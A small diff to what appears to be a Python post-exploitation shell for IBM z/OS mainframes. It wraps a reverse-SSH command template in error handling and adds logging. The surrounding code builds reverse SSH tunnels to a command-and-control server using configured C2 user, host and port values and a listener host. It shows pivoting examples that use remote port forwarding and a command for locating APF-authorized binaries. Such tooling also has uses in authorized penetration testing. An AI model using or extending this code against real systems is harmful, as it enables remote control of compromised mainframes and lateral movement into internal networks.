@@ -2,6 +2,7 @@
 
 Also provide some z/OS and ssh pivoting specific commands"""
 import argparse
+import logging
 from string import Template
 from reverse_shell_management import WrappingShell
 
@@ -33,18 +34,23 @@ EXAMPLES:
 
     Get access to a webserver as the mainframe:
     > _runssh -R 8000:web.server.tld:80"""
-        config = self.status_config
-        ssh_step = Template(self.REVERSE_SH_SSH).substitute(
-            KEYNAME=config['ftpkeyname'],
-            KNOWNHOSTSFILE=config['ftpknownhosts'],
-            CCU=config['cc_user'],
-            CCS=config['cc_server'],
-            CCP=config['cc_port'],
-            NCIP=config['ebcdiccat_host'],
-            NCP=config['ebcdiccat_port']
-            )
-        run_ssh_command = ssh_step + args + '&'
-        self.default(run_ssh_command)
+        try:
+            config = self.status_config
+            ssh_step = Template(self.REVERSE_SH_SSH).substitute(
+                KEYNAME=config['ftpkeyname'],
+                KNOWNHOSTSFILE=config['ftpknownhosts'],
+                CCU=config['cc_user'],
+                CCS=config['cc_server'],
+                CCP=config['cc_port'],
+                NCIP=config['ebcdiccat_host'],
+                NCP=config['ebcdiccat_port']
+                )
+            run_ssh_command = ssh_step + args + '&'
+            self.default(run_ssh_command)
+        except AttributeError as e:
+            logging.error("No reverse SSH shell config found.")
+            logging.error("Running in detached mode?")
+
 
     def do__findapf(self, args):
         """Find the APF binaries by running a find conmmand into the output file.
